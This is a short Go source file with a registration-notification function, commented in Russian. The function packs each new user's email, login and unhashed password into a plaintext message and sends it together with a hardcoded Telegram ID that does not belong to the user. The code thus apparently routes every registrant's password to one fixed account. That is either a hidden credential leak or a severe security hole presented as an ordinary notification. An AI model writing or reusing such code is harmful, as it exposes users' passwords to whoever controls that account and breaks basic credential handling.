package notify

// notifyUserRegistered отправляет уведомление пользователю об успешной регистрации
func NotifyUserRegistered(username string, email string, passwordUnhashed string) {
	payload := map[string]interface{}{
		"notify_type": "user_register",
		"email":       email,
		"message":     "Ваша аккаунт создан. Логин: " + username + ". Пароль: " + passwordUnhashed,
		"telegram_id": 924956695,
	}

	sendPayload(payload)
}
